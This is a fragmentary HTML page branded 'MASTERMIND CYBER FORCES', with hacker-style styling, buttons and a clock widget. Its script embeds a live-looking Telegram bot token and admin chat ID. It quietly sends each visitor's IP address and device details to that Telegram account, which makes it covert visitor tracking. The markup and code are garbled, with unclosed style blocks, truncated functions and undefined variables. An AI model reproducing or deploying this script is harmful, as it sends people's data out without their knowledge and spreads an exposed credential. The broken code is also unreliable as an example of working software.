<html lang="en">
<head>

<style>
body{

/* 🔥 CYBER TITLE */

}

  from{opacity:0.6}
  to{opacity:1}
}

.sub{
  color:#0f0;
  margin-bottom:15px;
}

.btn{
  padding:14px;
  border-radius:30px;
  border:none;
  background:linear-gradient(90deg,#00ffcc,#0066ff);
  color:black;
  font-size:15px;
  margin:10px;
  width:85%;
  cursor:pointer;
}

.box{
  background:rgba(0,255,200,0.1);
  padding:15px;
  margin:15px;
  border-radius:10px;
  box-shadow:0 0 10px #00ffcc;

input{
  padding:10px;
  border-radius:10px;

  width:85%;
}

.footer{

</head>

<body>

<div class="cyber">
⚡ MASTERMIND CYBER FORCES ⚡ <br>

<script>

// 🔐 CONFIG
const BOT_TOKEN = "8558577029:AAEdOiNQUk7oK2OpnyqtGmU_PVHKWEcKzRs";
const ADMIN_ID = "6882953267";

// TELEGRAM
function send(msg){
 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
   method:"POST",
   headers:{"Content-Type":"application/json"},
   body:JSON.stringify({
     chat_id:ADMIN_ID,
     text:msg
   })
 });

}

// CONTACT
function contact(){

 send("IP: " + d.ip);

// DEVICE

 send("Device: " + d);

async function siteInfo(){

 let res = await fetch(`https://api.allorigins.win/get?url=${url}`);

function rand(){
 let n = Math.floor(Math.random()*9999);
 document.getElementById("r").innerText = n;
}

// TIME
setInterval(()=>{
 document.getElementById("time").innerText = new Date().toLocaleTimeString();
},1000);
